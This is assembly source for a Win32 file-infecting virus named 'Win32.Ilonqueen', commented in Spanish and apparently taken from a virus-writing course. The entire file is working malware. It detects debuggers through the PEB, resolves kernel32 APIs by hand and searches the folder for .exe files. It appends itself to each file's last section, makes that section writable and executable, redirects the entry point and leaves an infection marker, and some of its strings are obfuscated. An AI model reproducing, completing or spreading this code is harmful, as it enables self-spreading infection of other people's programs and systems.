;
;   Virus del curso de introducción a la programación
;   de virus de zeroPad
;
;   Esta variante introduce una modificación para calcular el OEP 
;   durante la ejecución del archivo infectado en lugar de ser 
;   hardcodeada por la rutina de infección

.486
.model flat, stdcall
option casemap:none
assume fs:nothing ; necesario para que no tome cualquier valor de fs



include data.inc



.code

start:

iniciovir:
;=============================================
;   Salvaguarda de registros
;=============================================
    pushad
    pushfd
;=============================================
;           acá irá nuestro virus
;=============================================

	; como hemos hecho pushad y pushfd, tenemos que sumar 24h que es el número de bytes 
	; que meten en la pila
    mov ebx, dword ptr [esp + 24h] ; para luego para obtener la base de kernel32

;===============================================================
;               Cálculo del DELTA OFFSET 
;===============================================================

    ; Delta offset para poder emplazar las variables
    call delta
    db 04eh,06fh,020h,068h,061h,062h,0c3h,0adh,061h,020h,06dh,0c3h,0a1h,073h,020h,071h,075h,065h,020h,06fh,073h
    db 063h,075h,072h,069h,064h,061h,064h,020h,06dh,069h,073h,020h,06ch,061h,062h,069h,06fh,073h,020h,074h,065h
    db 06dh,062h,06ch,061h,062h,061h,06eh,020h,073h,069h,06eh,020h,070h,061h,072h,061h,072h,020h,053h,06fh,06ch
    db 061h,020h,065h,06eh,020h,06dh,069h,020h,070h,069h,065h,07ah,061h,020h,079h,06fh,020h,06ch,06ch,06fh,072h
    db 061h,062h,061h,020h,043h,075h,061h,06eh,074h,06fh,020h,06dh,0c3h,0a1h,073h,020h,079h,06fh,020h,06dh,065h
    db 020h,061h,063h,065h,072h,071h,075h,0c3h,0a9h,020h,063h,06fh,06eh,020h,06dh,0c3h,0a1h,073h,020h,068h,065h
    db 072h,069h,064h,061h,073h,020h,079h,06fh,020h,071h,075h,065h,064h,0c3h,0a9h,020h,044h,065h,062h,065h,073h
    db 020h,063h,075h,06dh,070h,06ch,069h,072h,020h,06ch,06fh,020h,071h,075h,065h,020h,070h,072h,06fh,06dh,065h
    db 074h,065h,073h,020h,04eh,061h,064h,069h,065h,020h,06dh,065h,020h,073h,061h,06ch,076h,061h,072h,061h,020h
    db 059h,020h,073h,06fh,06ch,06fh,020h,061h,020h,044h,069h,06fh,073h,020h,06ch,065h,020h,070h,065h,064h,069h
    db 072h,0c3h,0a9h,020h,071h,075h,065h,020h,061h,020h,065h,073h,074h,065h,020h,061h,06dh,06fh,072h,020h,06eh
    db 06fh,020h,06ch,06fh,020h,064h,065h,073h,067h,061h,072h,072h,065h,020h,06dh,0c3h,0a1h,073h,020h,049h,020h
    db 06eh,065h,065h,064h,020h,079h,06fh,075h,072h,020h,06ch,06fh,076h,065h,020h,049h,027h,06dh,020h,061h,020h
    db 062h,072h,06fh,06bh,065h,06eh,020h,072h,06fh,073h,065h,020h,045h,06eh,020h,06dh,069h,020h,063h,061h,062h
    db 065h,07ah,061h,020h,073h,069h,065h,06dh,070h,072h,065h,020h,065h,073h,063h,075h,063h,068h,06fh,020h,074h
    db 075h,020h,063h,061h,06eh,063h,069h,0c3h,0b3h,06eh,020h,04dh,065h,020h,072h,065h,063h,075h,065h,072h,064h
    db 061h,020h,071h,075h,065h,020h,06eh,06fh,020h,074h,065h,06eh,067h,06fh,020h,073h,061h,06ch,076h,061h,063h
    db 069h,0c3h,0b3h,06eh,020h,049h,020h,06eh,065h,065h,064h,020h,079h,06fh,075h,072h,020h,06ch,06fh,076h,065h
    db 020h,049h,027h,06dh,020h,061h,020h,062h,072h,06fh,06bh,065h,06eh,020h,072h,06fh,073h,065h,020h,043h,06fh
    db 06eh,020h,06ch,061h,020h,074h,072h,069h,073h,074h,065h,07ah,061h,020h,06dh,065h,020h,063h,06fh,06eh,067h
    db 065h,06ch,061h,072h,0c3h,0a9h,020h,045h,073h,020h,06dh,0c3h,0adh,020h,064h,06fh,06ch,06fh,072h,02ch,020h
    db 064h,065h,020h,06dh,069h,020h,076h,069h,064h,061h,020h,073h,0c3h,0a1h,06ch,076h,061h,06dh,065h,020h,049h
    db 020h,077h,061h,06eh,06eh,061h,020h,06eh,065h,065h,064h,020h,079h,06fh,075h,072h,020h,06ch,06fh,076h,065h
    db 020h,049h,027h,06dh,020h,061h,020h,062h,072h,06fh,06bh,065h,06eh,020h,072h,06fh,073h,065h,020h,049h,020h
    db 077h,061h,06eh,06eh,061h,020h,06eh,065h,065h,064h,020h,079h,06fh,075h,072h,020h,06ch,06fh,076h,065h,020h
delta:
    pop ebp
    lea ebp,[ebp + 020Dh]
    sub ebp,offset delta ; restamos el offset de delta

save_entryPoin:
    ; Guardamos el entry point original, que está aquí guardado al principio
    mov eax,dword ptr [ebp + entryPoinOrig] 
    mov dword ptr [ebp + entryPointSave],eax 


    call getKernel32
    call getPEHeader
    call GiveMeGetProcAddress
    call GiveMeLoadLibrary

    call ObtenerAPIs
    call getBaseImageMemory

    cmp [ebp+NtGlobalFlags],33
    je salida

    cmp [EBP+IsDebugged],77
    je salida
    
;===============================================================
;				Buscar el primer archivo exe
;===============================================================
	mov [ebp+archivosInfec],1 ; inicializamos el contador de infección
	lea edx, [ebp + FindData]
	lea ebx, [ebp + mascara]

	push edx
	push ebx 
	call [ebp+ddFindFirst]

	inc eax ; si al aumentar sale 0, error
	jz salida

    dec eax
	mov [ebp + handleBusq],eax
	call infectar

buscaVictima:
	lea edx, [ebp + FindData]
	mov ebx, [ebp + handleBusq]
	push edx
	push ebx
	call [ebp + ddFindNext]   	; Busca el proximo archivo

	test eax,eax
	jz salida

    cmp [ebp + archivosInfec],maxInfecciones
    jg Host

	call infectar
	jmp buscaVictima 

salida:
	cmp ebp,0 			; que ebp el delta offset sea 0, sólo será en el archivo principal
    je Host 

   
;=============================================
;			Recuperación de registros
;=============================================
    mov eax,[ebp + BaseFileMemory]           ; eax = ImageBase del host en memoria
    mov ebx,[ebp + entryPointSave]           ; ebx = Entry point real guardado 
    add ebx,eax
    
    call finish_it
finish_it:
    pop edi
    lea edi,[edi + 9]
    mov dword ptr [edi],ebx

    popfd
    popad

    db 104,0,0,0,0      ; Monta la instrucción push <original_entry_point>
    ret


Funciones:

    getBaseImageMemory proc
    ;===============================================================
    ;               Función para obtener la base del archivo en memoria
    ;===============================================================

        push 0
        call dword ptr  [ebp+ddGetModuleHandleA]

        mov dword ptr [ebp+BaseFileMemory], eax

        ret
    getBaseImageMemory endp

    getKernel32 proc
    ;===============================================================
    ;				Función para obtener la base de kernel32
    ;===============================================================

    	;===============================================================
    	;              Modificamos el handler del SEH por si error
    	;===============================================================
    	    ; modificamos el manejador de excepciones para que no AGA1PT
    	    push offset SEH_Handler    ; puntero a mi manejador
    	    mov eax,fs:[0]             ; guardo actual puntero a SEH en eax
    	    push eax                   ; puntero al siguiente manejador
    	    mov fs:[0],esp


            mov eax,fs:[030h]
            call getIsDebugged
            call getNtGlobalFlags


    	    jmp getK32

    	    SEH_Handler:
    	        mov esp, dword ptr[esp+8]  ; recuperamos la pila
    	        mov fs:[0],esp             ; metemos en fs[0] el puntero del handler del sistema
    	        jmp getK32                 ; retornamos

    	;===============================================================
    	;               Obtención de la base de Kernel32 
    	;               estamos precavidos ante errores
    	;===============================================================
    	getK32:
    	    ; otro metodo para obtener la base de kernel32, también sería posible usando
    	    ; el segmento fs, tal como se vio en el método VALTHEK
    	    mov eax, ebx           ; metemos una posible dirección de kernel32 en eax
    	    and eax, 0FFFFF000h    ; nos quedamos con la parte alta

    	    obtenK32:                      ; bucle para obtener la base de kernel32
    	        sub eax,1000h 
    	        cmp word ptr [eax],'ZM'    ; vemos si es la cabecera de Kernel32
    	        jnz obtenK32

    	    mov [ebp+MZKernel],eax 

        ;===============================================================
    	;             Reestablecer el SEH Handler 
    	;===============================================================
        ; una vez finalizado, volvemos a montar el manejador de excepciones 
        mov eax,dword ptr[esp]
        mov fs:[0],eax
        add esp,8

        ret
    getKernel32 endp


    getNtGlobalFlags proc
    ;=============================================
    ;       PEB!NtGlobalFlags
    ;   Offset 0x68 dentro del PEB este valor 
    ;   estos flags valdrán 0x70 si están en
    ;   un debugger
    ;=============================================
        push ebx
        mov ebx,[eax+68h]
        and ebx,070h
        test ebx,ebx 
        pop ebx
        jnz @DebuggerDetected
        mov byte ptr [ebp + NtGlobalFlags], 132
        ret 

        @DebuggerDetected:
            mov byte ptr [ebp + NtGlobalFlags],33
            ret
    getNtGlobalFlags endp



    getIsDebugged proc
    ;=============================================
    ;       PEB!IsDebugged
    ;   Técnica como la anterior, pero esta vez
    ;   miramos el PEB nosotros a mano
    ;=============================================
        push ebx
        mov bl,byte ptr [eax+2]
        test bl,bl
        pop ebx
        jnz @DebuggerDetected 
        mov byte ptr [ebp + IsDebugged],40
        ret 
        @DebuggerDetected:
            mov byte ptr [ebp + IsDebugged],77
            ret
    getIsDebugged endp

    getPEHeader proc
    ;===============================================================
    ;           Obtención de la cabecera PE
    ;===============================================================
        mov edi,[ebp+MZKernel]
        mov eax, dword ptr [edi + 03Ch] ; El RVA de la cabecera PE 
        add eax,edi 					; Al RVA hay que sumarle la base
        mov [ebp+PEHeader],eax
        ret
    getPEHeader endp


    GiveMeGetProcAddress proc
    ;===============================================================
    ;           Obtención de la dirección de GetProcAddress
    ;===============================================================
        mov edi,[ebp+MZKernel]
        mov eax,[ebp+PEHeader]

        ;===============================================================
        ; 		Obtención de la dirección completa de ExportTable
        ;===============================================================
        mov esi, dword ptr [eax+078h] 	; Obtenemos el RVA de la exportTable
        add esi, edi 					; ExportTable direccion absoluta 

        ;===============================================================
        ; 	Obtención de AddressOfNames para buscar por nombre la función
        ;===============================================================
        mov edx, dword ptr [esi+020h] 	; AddressOfNames
        add edx,edi

        xor ecx, ecx

        ;===============================================================
        ; 					Obtención del desplazamiento 
        ;===============================================================
        bucle:
            mov eax, dword ptr [edx] ; Offset de un nombre
            add eax,edi 			 ; obtenemos la dirección absoluta
            cmp dword ptr [eax],'PteG'
            jnz NoPs
            cmp dword ptr [eax+4h],'Acor'
            jnz NoPs
            cmp dword ptr [eax+8h],'erdd'
            jnz NoPs
            jmp DPM
        NoPs:
            add edx, 4h 			; Apuntamos al siguiente método
            inc ecx
            jmp bucle

        DPM:
            ; Ahora en ECX tenemos el número de desplazamiento de GetProcAddress
            rol ecx, 1h 					; multiplico por 2
            mov edx, dword ptr [esi+24h] 	; AddressOfNameOrdinals
            add edx, edi 					; Obtenemos dirección absoluta de AddressOfNameOrdinals
            add edx, ecx
            movzx ecx, word ptr [edx] 		; Offset de la direccion de la funcion
            
            mov edx, dword ptr [esi+01ch] 	; RVA de AddressOfFunctions
            add edx, edi 					; Direccion absoluta AddressOfFunctions
            rol ecx,2h 						; Multiplicamos ecx por 4
            add edx, ecx 					; Offset de la dirección
            mov eax, dword ptr [edx]
            add eax, edi 					; Sumamos la base del kernel
            
            mov [ebp+ddGetProcAddress],eax

            ret
    GiveMeGetProcAddress endp


    GiveMeLoadLibrary proc
    ;===============================================================
    ;           Obtención de la dirección de LoadLibrary
    ;===============================================================
        mov edi,[ebp+MZKernel]
        mov eax,[ebp+ddGetProcAddress]

        lea esi,[ebp + stLoadLibrary]
        push esi
        push edi
        call eax

        mov [ebp+ddLoadLibrary],eax

        ret
    GiveMeLoadLibrary endp


    GiveMeFunction proc
    ;===============================================================
    ;			Obtención de cualquier función 
    ;			a través de LoadLibrary y GetProcAddress
    ;			retorna en eax la dirección de esa función
    ;===============================================================
        mov esi, dword ptr [esp + 4] ; meto el nombre de la librería
    	mov edi, dword ptr [esp + 8] ; meto el nombre de la función

    	; Obtención de la librería
    	mov ebx, [ebp+ddLoadLibrary]
    	push esi
    	call ebx

    	; Obtención de la función
    	mov ebx, [ebp+ddGetProcAddress]
    	push edi
    	push eax
    	call ebx

    	ret
    GiveMeFunction endp


    ObtenerAPIs proc 
    ;===============================================================
    ;           Función para obtener la dirección de las apis 
    ;           antes escritas en las strings
    ;===============================================================
        ; como esas APIs y variables están referenciadas
        ; en memoria contiguas, podemos avanzar con punteros
        lea esi, [ebp+ stAPIs]      ; inicio de la tabla de nombres de las API's
        lea edi, [ebp+ ddFindFirst] ; inicio de la tabla de direcciones

        dec esi                     ; pa cuadrar
        obtieneAPI:
            inc esi                         ; recuadramos
            push esi                        ; mete el string
            push [ebp + MZKernel]           ; mete la dirección de kernel32
            call [ebp + ddGetProcAddress]   ; llama a GetProcAddress
            mov [edi],dword ptr eax         ; guarda la dirección obtenida
            add edi,04h                     ; aumenta al siguiente puntero
        buscaSiguiente:
            inc esi 
            cmp  byte ptr [esi], 0h
            jne buscaSiguiente

            cmp byte ptr[esi+1],0h          ; vemos si el siguiente es el final
            jne obtieneAPI                  ; si no es así, podemos seguir

            ret
    ObtenerAPIs endp

    infectar proc 
    ;===============================================================
    ; 			Rutina de infectado del virus
    ;===============================================================

        ; Obtención del tamaño de virus + archivo
        mov edi, longVirus          ; Longitud del virus
        add edi,[ebp + FindData.WFD_nFileSizeLow]
        mov [ebp + longVirusHost], edi

        ;========================================================================
        ; Llamamos a la función CreateFile para abrir el archivo 
        ;========================================================================
        xor ecx,ecx
        push ecx 
        push ecx            ; Atributos del archivo: archive, normal, sistema, etc
        push 3              ; 3 = OPEN_EXISTING
        push ecx            
        inc ecx             
        push ecx            ; Abrir en modo compartido ( 1 = FILE_SHARE_READ )
        push 0C0000000h     ; modo de acceso (read-write)
        lea ebx, [ebp + FindData.WFD_szFileName]    ; nombre del archivo
        push ebx
        call [ebp + ddCreateFile]

        cmp eax,-1
        jz buscaVictima
        mov [ebp + handleCreate], eax               ; guardamos el handle del archivo

        ;========================================================================
        ; Mapeamos el archivo en memoria
        ;========================================================================
        ; Mapeamos el archivo en memoria
        xor ecx, ecx
        push ecx                ; creamos el objeto sin nombre
        push [ebp + FindData.WFD_nFileSizeLow] 
        push ecx
        push 04h                ; 4h = PAGE_READWRITE: lectura y escritura
        push ecx                
        push eax                ; handle devuelto por CreateFileA
        call [ebp + ddCreateFileM]

        cmp eax,0
        je cerrarArchivo
        mov [ebp + handleMem], eax      ; guardamos el handle en una variable

        ;========================================================================
        ; Creamos la copia en memoria para poder accederlo
        ;========================================================================
        ; Hacemos un MapViewOfFile para cargar los datos en memoria
        push [ebp + FindData.WFD_nFileSizeLow]
        push 0
        push 0
        push 000F001Fh                  ; Modo de acceso completo
        push eax                        ; handler devuelto por CreateFileMemoryMap
        call [ebp + ddMapViewOfFile]

        cmp eax, 0                      ; by the flyies
        je cierraMapeo
        mov [ebp + inicioHostMem], eax

        ;===============================================================
        ; A partir de aquí empezamos a mirar algunos requisitos del archivo
        ;===============================================================

        ; Miramos si sus primeros bytes son MZ
        cmp word ptr [eax],'ZM'
        jnz desmapearArchivo

        ; Miramos si la cabecera contiene el PE
        add eax,03Ch                    ; Vamos al RVA de la PE
        mov ebx,[eax]                   ; Obtenemos el RVA
        add ebx,[ebp + inicioHostMem]   ; sumo la base del mapeo
        cmp word ptr [ebx], 'EP'        ; es PE?
        jnz desmapearArchivo

        ; Miramos si el tamaño del OptionalHeader es más que 0
        mov [ebp + hostPE], ebx         ; guardo la dirección de PE
        add ebx,14h                     ; Obtengo el SizeOfOptionalHeader
        movzx eax, word ptr [ebx]       ; Obtengo el tamaño del OptionalHeader (es un word)
        test eax,eax                    ; miro si es 0, en tal caso, a la mierda
        jz desmapearArchivo

        ; Miramos en las características si es un ejecutable
        mov ebx,[ebp + hostPE]
        add ebx, 16h            ; Apuntamos a las características
        mov ax, word ptr [ebx]  ; metemos en ax las características
        and ax, 0002h           ; ¿es ejecutable?
        jz desmapearArchivo

        ; Checkear si el binario ya fue manejado
        ; para ello dejaremos una marca en un campo no usado
        mov ebx,[ebp + hostPE]
        cmp dword ptr [ebx + 04Ch],'ILKA' 
        je desmapearArchivo

        ; Control de archivos infectados
        inc [ebp + archivosInfec]

        ; Obtención de los campos FileAlignment y SectionAlignment
        add     ebx, 03Ch                   ; RVA del FileAlignment
        mov     edx,[ebx]                   ; edx = alineamiento del archivo en disco
        mov     [ebp + AlineamArchivo], edx ; lo guardamos

        mov     ebx, [ebp + hostPE]         ; dirección de la cabecera PE del host
        add     ebx, 038h                   ; RVA sel SectionAlignment
        mov     edx, [ebx]                  ; edx = alineamiento del archivo en memoria
        mov     [ebp + AlineamSeccion], edx ; lo guardamos

        ;========================================================================
        ; Desmapeo del archivo en memoria y lo vuelvo a abrir con el tamaño del
        ; archivo mas el del virus
        ;========================================================================
        push [ebp + inicioHostMem]
        call [ebp + ddUnmapViewOfFile]

        push [ebp + handleMem]
        call [ebp + ddCloseHandle]

        ;========================================================================
        ; Calculamos el tamaño alineado del host mas el virus
        ;========================================================================
        mov ebx,[ebp + AlineamArchivo]
        mov eax,[ebp + longVirusHost]       ; tamaño del archivo + el virus
        xor edx,edx                         ; edx = 0 para realizar la división
        div ebx                             ; dividimos tamaño por alineamiento

        cmp edx, 0                          ; en edx queda el resto, miramos si es 0
        je no_incrementa
        inc eax

    	no_incrementa:
    	    mov edx, [ebp + AlineamArchivo]     ; recupero el alineamiento
    	    mul edx                             ; multiplico por el alineamiento
    	    mov ebx, eax                        ; guardamos en ebx, el valor obtenido

    	;=====================================================
    	;			Reabrimos el archivo ahora con el tamaño 
    	;			unido al virus
    	;=====================================================
    	xor ecx,ecx
    	push ecx 
    	push ebx 								 ; Mapea tamaño de archivo más virus
    	push ecx 
    	push 04h 								 ; 4h = PAGE_READWRITE
    	push ecx
    	push [ebp + handleCreate]				 ; handle devuelto por CreateFileA
    	call [ebp + ddCreateFileM]	

    	test eax,eax
    	jz cerrarArchivo
    	mov [ebp + handleMem], eax 				 ; Guardamos el handle

        ;========================================================================
        ; Creamos la copia en memoria para poder accederlo
        ;========================================================================
    	xor ecx,ecx
    	push ebx 								 ; tamaño del archivo + el virus (alineado)	
    	push ecx 
    	push ecx 
    	push 000F001Fh 							 ; access mode (acceso completo)
    	push eax 								 ; handle devuelto por CreateFileMappingA
    	call [ebp + ddMapViewOfFile]

    	test eax,eax
    	jz cierraMapeo
    	mov [ebp + inicioHostMem], eax

    	;=====================================================
    	; Busqueda de la sección última para hacer un virus postpending
    	;=====================================================
    	mov eax, [ebp + inicioHostMem]			 ; Inicio host mapeado en memoria
    	mov esi,[eax + 3Ch]                      ; cabecera PE del archivo mapeado
        add esi, eax                             ; Le sumamos la base ya que es una RVA
        movzx ebx, word ptr [esi + 14h]          ; bx = tamaño del Optional Header
        movzx ecx, word ptr [esi + 6h]           ; ecx = PE + 6h (cantidad de secciones)
        mov edx, [esi + 28h]                     ; PE + 28 = dirección del entry point original
        mov [ebp + entryPoinOrig], edx           ; lo guardamos para luego al final saltar ahí
        add esi,ebx                              ; sumamos a la base PE el tamaño del optional header
        add esi,18h                              ; +18h del tamaño de la cabecera PE (ahora apunto a las secciones)
        
        sub esi,28h                              ; le resto 28h (tamaño de cada sección para tener un bucle y empezar en la primera)
        xor eax,eax                              ; eax lo voy a usar para almacenar el mayor valor
        xor ebx,ebx                              ; ebx va a apuntar al inicio de la sección mayor

        proximaSeccion:
            add esi,28h                          ; esi = puntero a cada entrada de la tabla (lo dije antes)
            movzx edi, word ptr [esi + 14h]      ; en el offset 14h tengo el valor al PointerToRawData (comienzo de la sección)
            cmp edi, eax                         ; es mayor que la almacenada?
            jl noEsMayor
            ; Si es mayor, lo guardamos tanto tamaño como el puntero a la sección
            mov eax,edi                          ; si es mayor, guardo el valor
            mov ebx,esi                          ; y el puntero a la sección

        noEsMayor:
            loop proximaSeccion                  ; decremento ecx (donde guardo el número de secciones) y si es mayor que 0, volvemos

        ;===============================================
        ;           Ya tenemos la última sección
        ;           ahora modificarla para virusear
        ;			tendremos que ponernos detrás de 
        ;			esta última sección para agregar el virus
        ;===============================================
        or dword ptr [esi + 24h],0E0000020h       ; le metemos los permisos suficientes
        
        ; sumamos la base de la sección, más el tamaño
        mov esi, ebx
        mov edx,[esi + 10h] 					  ; SizeOfRawData de la sección
        add edx,[esi + 0Ch]						  ; SizeOfRawData + VirtualAddress

        ; Modificación de la cabecera, para cambiar el entry point
        mov eax, [ebp + inicioHostMem]			  ; eax = inicio del host mapeado en memoria
        mov edi, [eax + 3Ch] 					  ; edi = dirección del PE header del host
        add edi, eax 							  ; le sumo la base ya que es una RVA
        mov [edi + 28h],edx 					  ; cambio el valor del Entry Poin

        ;===============================================
        ; 			Obtención de la dirección para copiar
        ;			el virus, este debe ser copiado 
        ;			en disco y no en memoria (al contrario que antes)
        ;			que calculabamos la dirección donde daba saltar el EP
        ;			en MEMORIA, ahora la copia es en disco
        ;===============================================

        mov ebx, [esi + 10h] 					 ; en ESI tengo el inicio de la última seccion en memoria
        										 ; al sumar 10h, tengo en ebx, el SizeOfRawData (tamaño en disco)
     	add ebx, [esi + 14h] 					 ; Le sumo el valor de PointerToRawData (dirección en disco)
     	add ebx, [ebp + inicioHostMem]			 ; al ser un RVA le sumo la base
     	mov [ebp + UltimaSeccPE], ebx 			 ; lo guardamos

     	;===============================================
     	; Agrandamos esa última sección, teniendo en cuenta
     	; el VirtualSize (sólo sumarle el tamaño del virus)
     	; y el SizeOfRawData (sumarle el tamaño del virus),
     	; pero teniendo en cuenta el FileAlignment
     	;===============================================
     	mov eax, longVirus
     	add [esi + 08h], eax 					 ; en ESI tengo el inicio de la última sección en memoria
     											 ; y en sección + 08h la VirtualSize (ahora incrementada)
     	mov ebx,[esi + 10h]						 ; SizeOfRawData antes de modificar
     	mov [ebp + SizeOfRDAnt],ebx 		     ; lo guardamos en una variable

        add eax,ebx                              ; le sumo la SizeOfRawData actual y asi obtengo el valor a redondear 

     	mov ebx,[ebp + AlineamArchivo] 			 ; edx = alineamiento de las secciones en disco
     	xor edx,edx
     	div ebx 								 ; igual que antes dividimos por ebx
     	

     	cmp edx, 0 								 ; en edx queda el resto de la división
     	je no_incrementaSecc 		
     	inc eax 								 ; si el resto es distinto de cero le suma uno

     	no_incrementaSecc:
     		mov edx, [ebp + AlineamArchivo] 	 ; edx = alineamiento de las secciones en disco
     		mul edx 							 ; multiplico por el alineamiento y obtengo así el 
     											 ; tamaño alineado en eax
     		mov [ebp + SizeOfRDNuevo], eax 		 ; guardo el nuevo valor del 
     											 ; SizeOfRawData alineado
     		mov [esi + 10h],eax 				 ; Cambio el valor del SizeOfRawData del host

     	; Ahora debemos establecer el SizeOfImage como el total
     	; del malware, alineado
     	mov eax,[esi + 08h] 					 ; eax = VirtualSize
     	add eax,[esi + 0Ch]						 ; eax = VirtualSize + VirtualOffset

     	mov ebx, [ebp + AlineamSeccion] 		 ; ebx = alineamiento de las secciones en memoria

     	xor edx, edx 							 ; ponemos edx en cero para realizar la división
     	div ebx 								 ; dividimos por el alineamiento

     	cmp edx,0 								 ; en edx queda el resto de la división
     	je no_incrementaSizeOfI 
     	inc eax

     	no_incrementaSizeOfI:
     		mov edx,[ebp + AlineamSeccion] 		 ; edx = alineamiento de las secciones en memoria
     		mul edx 							 ; multiplico por el alineamiento y obtengo así el tamaño alineado en eax

     	mov esi,[ebp + inicioHostMem]   		 ; apuntamos al inicio del host mapeado en memoria
     	mov edi,[esi + 3Ch]						 ; edi = dirección del PE header del host
     	add edi,esi 							 ; sumamos la base ya que es una RVA

     	mov [edi + 50h],eax 					 ; guardo la nueva SizeOfImage obtenida

     	;===============================================
     	; 		Finalmente copiamos el virus en la memoria
     	; 		para ello usamos ret y movb
     	;===============================================
     	lea esi,[ebp + start]
     	mov edi,[ebp + UltimaSeccPE]
     	mov ecx,longVirus

     	rep movsb

        ;========================================================================
        ; Lo marco como infectado para no volverlo a infectar
        ;========================================================================
        ; ahora firmamos el archivo
        mov ebx, [ebp + hostPE]
        mov dword ptr [ebx + 04Ch],'ILKA'
        

        desmapearArchivo:
            ; Fin del virús
            push [ebp + inicioHostMem]
            call [ebp + ddUnmapViewOfFile]

        cierraMapeo:
            push [ebp + handleMem]
            call [ebp + ddCloseHandle]

        cerrarArchivo:
            push [ebp + handleCreate]
            call [ebp + ddCloseHandle]
            
    	ret
    infectar endp

datos_ricos:
    ;=============================================
    ;            Parte data, pero en code
    ;=============================================

    ; Datos de entry point tanto el que nos dejó el infector con nuestro OEP original
    ; que luego será usado para establecer el OEP de los otros infectados, como el que salve
    ; el nuestro para modificar
    entryPoinOrig           dd          0
    entryPointSave          dd          0

    ; Dirección base del binario en ejecución
    BaseFileMemory          dd          0

    ; Número de archivos infectados, ponemos un máximo de 3
    archivosInfec           db          0
    maxInfecciones          equ         3

    ; Direcciones necesarias para el programa (dirección de cabecera MZ, de la PE, de funciones...)
    MZKernel                dd          0   
    PEHeader                dd          0
    ddGetProcAddress        dd          0
    ddLoadLibrary           dd          0
    ddFindFirst             dd          ?
    ddFindNext              dd          ?
    ddCreateFile            dd          ?
    ddCreateFileM           dd          ?
    ddMapViewOfFile         dd          ?
    ddCloseHandle           dd          ?
    ddUnmapViewOfFile       dd          ?
    ddGetModuleHandleA      dd          ?
    ddGetModuleFileName     dd          ?
    ddExitProcess           dd          ?

    ; Flags para antidebugging
    NtGlobalFlags           db          0   ; 132 = bien; 33 = estamos siendo debuggeados
    IsDebugged              db          0   ; 40 = bien; 77 = estamos siendo deubggeados

    ; Strings usadas durante el programa
    ;stLoadLibrary          db          'LoadLibraryA',0
    stLoadLibrary           db          092h,0EAh,0BAh,0B7h,081h,03Fh,03Dh,071h,000h,0E1h,0FAh,0F8h,0
    stAPIs                  db          'FindFirstFileA',0
                            db          'FindNextFileA',0
                            db          'CreateFileA',0
                            db          'CreateFileMappingA',0
                            db          'MapViewOfFile',0
                            db          'CloseHandle',0
                            db          'UnmapViewOfFile',0
                            db          'GetModuleHandleA', 0
                            db          'GetModuleFileNameA',0
                            db          'ExitProcess',0
                            db          0

    stExitProcess           db          'ExitProcess',0
    stKernel32              db          'kernel32',0
    titulo                  db          '[Win32.Ilonqueen v0.3]',0

    ; Información para usar en la búsqueda de archivos y apertura del archivo
    FindData                WIN32_FIND_DATA <>
    mascara                 db          '*.exe',0
    handleBusq              dd          0
    handleCreate            dd          0
    handleMem               dd          0
    inicioHostMem           dd          0

    ; Información referente al propio virus para usar en las funciones
    longVirus               equ         finvir - start
    longVirusHost           dd          0

    ; Datos relativos al archivo infectado, los cuales modificaremos
    UltimaSeccPE            dd          0
    SizeOfRDAnt             dd          0                   ; SizeOfRawData antes del cambio
    SizeOfRDNuevo           dd          0                   ; SizeOfRawData después del cambio
    hostPE                  dd          0
    AlineamArchivo          dd          0
    AlineamSeccion          dd          0

    ; Información para el final del malware
    pathToModule            db          260     DUP     (0)



    mensaje         db      'Win32.Ilonqueen',10,10
                    db      'No game, no life',10,10


    

Host:


    mov eax,[ebp + ddGetModuleFileName]
    lea ebx, [ebp + pathToModule]
    push 259
    push ebx
    push 0
    call eax

    mov eax,[ebp+ddExitProcess]
    push 0
    call eax


finvir:

end start